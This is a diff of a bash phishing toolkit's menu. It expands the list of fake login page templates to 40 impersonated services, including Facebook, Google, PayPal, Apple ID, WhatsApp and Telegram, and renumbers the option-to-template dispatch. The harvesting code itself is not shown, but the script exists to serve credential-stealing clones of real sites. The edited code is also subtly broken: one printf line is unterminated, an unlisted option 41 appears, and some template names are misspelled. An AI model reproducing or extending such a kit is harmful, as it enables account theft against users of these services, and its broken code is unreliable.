@@ -35,172 +35,187 @@ command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not inst
 
 menu() {
 
-printf "          \e[1;101m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;0m Facebook\e[0m      \e[1;101m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;0m PayPal\e[0m        \e[1;101m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;0m eBay\e[0m            \n"                              
-printf "          \e[1;101m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;0m Google\e[0m        \e[1;101m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;0m Github   \e[0m    \e[1;101m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;0m Amazon\e[0m         \n"
-printf "          \e[1;101m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;0m Twitter\e[0m       \e[1;101m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;0m Pinterest   \e[0m     \e[1;101m[\e[0m\e[1;77m35\e[0m\e[1;92m]\e[0m\e[1;0m iCloud\e[0m          \n"
-printf "          \e[1;101m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;0m Instagram\e[0m     \e[1;101m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;0m Verizon   \e[0m   \e[1;101m[\e[0m\e[1;77m36\e[0m\e[1;92m]\e[0m\e[1;0m Spotify\e[0m          \n"                
-printf "          \e[1;101m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;0m Snapchat\e[0m      \e[1;101m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;0m Steam   \e[0m      \e[1;101m[\e[0m\e[1;77m37\e[0m\e[1;92m]\e[0m\e[1;0m Netflix\e[0m          \n"                
-printf "          \e[1;101m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;0m Yahoo\e[0m         \e[1;101m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;0m Twitch   \e[0m      \e[1;101m[\e[0m\e[1;77m38\e[0m\e[1;92m]\e[0m\e[1;0m Custom\e[0m         \n"
-printf "          \e[1;101m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;0m Linkedin\e[0m      \e[1;101m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;0m Yandex    \e[0m             \n"
-printf "          \e[1;101m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;0m Microsoft\e[0m     \e[1;101m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;0m Badoo   \e[0m                \n"        
-printf "          \e[1;101m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;0m Apple-ID\e[0m      \e[1;101m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;0m Devian-Art   \e[0m                   \n"         
-printf "          \e[1;101m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;0m Protonmail\e[0m    \e[1;101m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;0m Ebay   \e[0m               \n"
-printf "          \e[1;101m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;0m WiFi\e[0m          \e[1;101m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;0m Amazon   \e[0m            \n"
-printf "          \e[1;101m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;0m Wordpress\e[0m     \e[1;101m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;0m iCloud   \e[0m                \n"
-printf "          \e[1;101m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;0m Badoo\e[0m         \e[1;101m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;0m Spotify  \e[0m                \n"
-printf "          \e[1;101m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;0m Shopify\e[0m       \e[1;101m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;0m Netflix  \e[0m                              \n"
-printf "          \e[1;101m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;0m Apple ID\e[0m      \e[1;101m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;0m Bitcoin  \e[0m                             \n"
-printf "          \e[1;101m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;0m \e[0m       \e[1;101m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;0m Playstation  \e[0m           \e[1;94m                  \n"
+printf "\e[0m\e[1;91m  -----------------------------------------------------------------      ------------------------------------------------------------------          ------------------------------------------------------------------   \e[0m\n"
+ 
+printf "\e[0m\e[1;91m  |                       W E B - P A G E S                       |      |                       W E B - P A G E S                       |           |                    W E B - P A G E S (N E W)                   |    \e[0m\n"
+
+printf "\e[0m\e[1;91m  -----------------------------------------------------------------      ------------------------------------------------------------------          ------------------------------------------------------------------    \e[0m\n"
+printf "               \e[1;101m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;0m Facebook\e[0m      \e[1;101m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;0m PayPal\e[0m             \e[1;101m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;0m Tiktok\e[0m            \n"                              
+printf "               \e[1;101m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;0m Google\e[0m        \e[1;101m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;0m Github   \e[0m          \e[1;101m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;0m Reddit\e[0m         \n"
+printf "               \e[1;101m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;0m Twitter\e[0m       \e[1;101m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;0m Pinterest   \e[0m       \e[1;101m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;0m WT-Social\e[0m          \n"
+printf "               \e[1;101m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;0m Instagram\e[0m     \e[1;101m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;0m Verizon   \e[0m         \e[1;101m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;0m Quora\e[0m          \n"                
+printf "               \e[1;101m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;0m Snapchat\e[0m      \e[1;101m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;0m Steam   \e[0m           \e[1;101m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;0m Snapfish\e[0m          \n"                
+printf "               \e[1;101m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;0m Yahoo\e[0m         \e[1;101m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;0m Twitch   \e[0m          \e[1;101m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;0m Expert-IQ\e[0m         \n"
+printf "               \e[1;101m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;0m Linkedin\e[0m      \e[1;101m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;0m Yandex    \e[0m         \e[1;101m[\e[0m\e[1;77m35\e[0m\e[1;92m]\e[0m\e[1;0m Telegram\e[0m       \n"
+printf "               \e[1;101m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;0m Microsoft\e[0m     \e[1;101m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;0m Badoo   \e[0m           \e[1;101m[\e[0m\e[1;77m36\e[0m\e[1;92m]\e[0m\e[1;0m Youtube\e[0m       \n"        
+printf "               \e[1;101m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;0m Apple-ID\e[0m      \e[1;101m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;0m Devian-Art   \e[0m      \e[1;101m[\e[0m\e[1;77m37\e[0m\e[1;92m]\e[0m\e[1;0m LibertPay  \e[0m              \n"         
+printf "               \e[1;101m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;0m Protonmail\e[0m    \e[1;101m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;0m Shopping   \e[0m        \e[1;101m[\e[0m\e[1;77m38\e[0m\e[1;92m]\e[0m\e[1;0m ip-Finder  \e[0m    \n"
+printf "               \e[1;101m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;0m WiFi\e[0m          \e[1;101m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;0m Amazon   \e[0m          \e[1;101m[\e[0m\e[1;77m39\e[0m\e[1;92m]\e[0m\e[1;0m WhatsApp\e[0m    \n"
+printf "               \e[1;101m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;0m Wordpress\e[0m     \e[1;101m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;0m iCloud   \e[0m          \e[1;101m[\e[0m\e[1;77m40\e[0m\e[1;92m]\e[0m\e[1;0m Flipcart\e[0m        \n"
+printf "               \e[1;101m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;0m Badoo\e[0m         \e[1;101m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;0m Spotify  \e[0m               \n"                                          
+printf "               \e[1;101m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;0m Shopify\e[0m       \e[1;101m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;0m Netflix  \e[0m                \e[1;94m                               
 
 
 read -p $'\n\e[1;0m[\e[0m\e[1;77m*\e[0m\e[1;77m] Choose an option: \e[93m\en' option 
 
 
 if [[ $option == 1 ]]; then
-server="instagram"
+server="facebook"
 start
 
 elif [[ $option == 2 ]]; then
-server="facebook"
-start
-elif [[ $option == 3 ]]; then
-server="snapchat"
-start
-elif [[ $option == 4 ]]; then
-server="twitter"
-start
-elif [[ $option == 5 ]]; then
-server="github"
-start
-elif [[ $option == 6 ]]; then
 server="google"
 start
-
-elif [[ $option == 7 ]]; then
-server="origin"
+elif [[ $option == 3 ]]; then
+server="twitter"
 start
-
-elif [[ $option == 8 ]]; then
+elif [[ $option == 4 ]]; then
+server="instagram"
+start
+elif [[ $option == 5 ]]; then
+server="snapchat"
+start
+elif [[ $option == 6 ]]; then
 server="yahoo"
 start
 
-elif [[ $option == 9 ]]; then
+elif [[ $option == 7 ]]; then
 server="linkedin"
 start
 
-elif [[ $option == 10 ]]; then
-server="protonmail"
-start
-
-elif [[ $option == 11 ]]; then
-server="wordpress"
-start
-
-elif [[ $option == 12 ]]; then
+elif [[ $option == 8 ]]; then
 server="microsoft"
 start
 
-elif [[ $option == 13 ]]; then
-server="instafollowers"
-start
-
-elif [[ $option == 14 ]]; then
-server="pinterest"
-start
-
-elif [[ $option == 15 ]]; then
+elif [[ $option == 9 ]]; then
 server="apple"
 start
 
-elif [[ $option == 16 ]]; then
-server="verizon"
+elif [[ $option == 10 ]]; then
+server="protomail"
 start
 
-elif [[ $option == 17 ]]; then
-server="dropbox"
-start
-
-elif [[ $option == 18 ]]; then
-server="adobe"
-start
-
-elif [[ $option == 19 ]]; then
-server="shopify"
-start
-
-elif [[ $option == 20 ]]; then
-server="messenger"
-start
-
-elif [[ $option == 21 ]]; then
-server="gitlab"
-start
-
-elif [[ $option == 22 ]]; then
-server="twitch"
-start
-
-elif [[ $option == 23 ]]; then
-server="myspace"
-start
-
-elif [[ $option == 24 ]]; then
-server="badoo"
-start
-
-elif [[ $option == 25 ]]; then
-server="vk"
-start
-
-elif [[ $option == 26 ]]; then
-server="yandex"
-start
-
-elif [[ $option == 27 ]]; then
-server="devianart"
-start
-
-elif [[ $option == 28 ]]; then
+elif [[ $option == 11 ]]; then
 server="wifi"
 start
 
-elif [[ $option == 29 ]]; then
+elif [[ $option == 12 ]]; then
+server="wordpress"
+start
+
+elif [[ $option == 13 ]]; then
+server="badoo"
+start
+
+elif [[ $option == 14 ]]; then
+server="shopify"
+start
+
+elif [[ $option == 15 ]]; then
 server="paypal"
 start
 
-elif [[ $option == 30 ]]; then
-server="steam"
+elif [[ $option == 16 ]]; then
+server="github"
 start
 
-elif [[ $option == 31 ]]; then
-server="bitcoin"
+elif [[ $option == 17 ]]; then
+server="pinterest"
 start
 
-elif [[ $option == 32 ]]; then
-server="playstation"
+elif [[ $option == 18 ]]; then
+server="verizon"
 start
 
-elif [[ $option == 33 ]]; then
+elif [[ $option == 19 ]]; then
+server="stream"
+start
+
+elif [[ $option == 20 ]]; then
+server="twitch"
+start
+
+elif [[ $option == 21 ]]; then
+server="yandex"
+start
+
+elif [[ $option == 22 ]]; then
+server="devianart"
+start
+
+elif [[ $option == 23 ]]; then
 server="shopping"
 start
 
-elif [[ $option == 34 ]]; then
+elif [[ $option == 24 ]]; then
 server="amazon"
 start
 
-elif [[ $option == 35 ]]; then
+elif [[ $option == 25 ]]; then
 server="icloud"
 start
 
-elif [[ $option == 36 ]]; then
+elif [[ $option == 26 ]]; then
 server="spotify"
 start
 
-elif [[ $option == 37 ]]; then
+elif [[ $option == 27 ]]; then
 server="netflix"
 start
 
+elif [[ $option == 28 ]]; then
+server="dropbox"
+start
+
+elif [[ $option == 29 ]]; then
+server="tiktok"
+start
+
+elif [[ $option == 30 ]]; then
+server="reddit"
+start
+
+elif [[ $option == 31 ]]; then
+server="wtsocial"
+start
+
+elif [[ $option == 32 ]]; then
+server="quora"
+start
+
+elif [[ $option == 33 ]]; then
+server="snapfish"
+start
+
+elif [[ $option == 34 ]]; then
+server="expertiqtrading"
+start
+
+elif [[ $option == 35 ]]; then
+server="telegram"
+start
+
+elif [[ $option == 36 ]]; then
+server="youtube"
+start
+
+elif [[ $option == 37 ]]; then
+server="libertpay"
+start
+
 elif [[ $option == 38 ]]; then
+server="ipfinder"
+start
+
+elif [[ $option == 39 ]]; then
+server="whatsapp"
+start
+
+elif [[ $option == 40 ]]; then
+server="flipcart"
+start
+
+elif [[ $option == 41 ]]; then
 server="create"
 createpage
 start
